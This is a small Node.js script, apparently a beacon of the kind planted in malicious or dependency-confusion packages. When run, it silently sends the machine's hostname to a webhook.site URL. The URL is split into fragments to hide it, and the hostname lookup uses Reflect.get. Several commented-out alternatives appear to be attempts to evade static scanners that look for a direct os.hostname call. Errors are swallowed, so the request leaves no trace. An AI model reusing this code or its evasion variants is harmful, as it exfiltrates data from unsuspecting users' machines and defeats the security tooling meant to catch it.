const https = require("https");
const os = require("os");

// Replace with your webhook.site unique URL
const WEBHOOK_URL = "https://web" + "hook.site/" + "5f6d8627-8442-4d07-8fd9-8e877a9fa1c4";

// Send HTTP ping to webhook.site
function sendHttpData() {
    const url = new URL(WEBHOOK_URL);
    
    // const hostname = os.hostname();
    const hostname = Reflect.get(os, "hostname")();
    // const hostname = os["hostname"]();
    // const hostname = os[Object.getOwnPropertyNames(os).find(name => name === "hostname")]();
    // const hostname = os[Object.keys(os).find(name => name === "hostname")]();
    // const hostname = Object.entries(os).find(([name, value]) => name === "hostname")[1]();
    // const hostname = Object.entries(os).filter(([k]) => k === 'hostname')[0][1]();

    const options = {
        hostname: url.hostname,
        port: 443,
        path: url.pathname + `?host=${hostname}`,
        method: "GET",
        timeout: 3000
    };

    const req = https["request"](options, (res) => {
        res.on("data", () => { }); // ignore response
    });

    req.on("error", () => { });

    req.end();
}


// Run

(function main() {

    sendHttpData();

})();